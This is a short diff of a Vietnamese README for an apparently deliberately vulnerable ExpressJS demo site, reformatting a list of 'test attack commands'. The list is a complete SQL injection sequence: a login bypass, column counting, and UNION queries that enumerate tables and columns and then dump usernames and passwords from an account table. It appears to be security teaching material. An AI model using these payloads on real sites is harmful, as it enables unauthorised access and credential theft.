@@ -10,14 +10,14 @@
 - Bootstrap
 - ExpressJS 
 
-9. Các câu lệnh tấn công thử trên web:
-    - [' OR 1 = 1 -- ]
-    - [' ORDER BY 4 -- ]
-    - [' ORDER BY 5 -- ]
-    - [' UNION SELECT 1, 2, 3, 4 -- ]
-    - [' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= DATABASE() -- ]
-    - [' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'account' -- ]
-    - [' UNION SELECT id, password, username, 4 FROM account -- ]
+### Các câu lệnh tấn công thử trên web (copy bỏ dấu "[" và "]")
+- [' OR 1 = 1 -- ]
+- [' ORDER BY 4 -- ]
+- [' ORDER BY 5 -- ]
+- [' UNION SELECT 1, 2, 3, 4 -- ]
+- [' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= DATABASE() -- ]
+- [' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'account' -- ]
+- [' UNION SELECT id, password, username, 4 FROM account -- ]
 
 ### Hướng dẫn run code
 #### 1. Cài ứng dụng
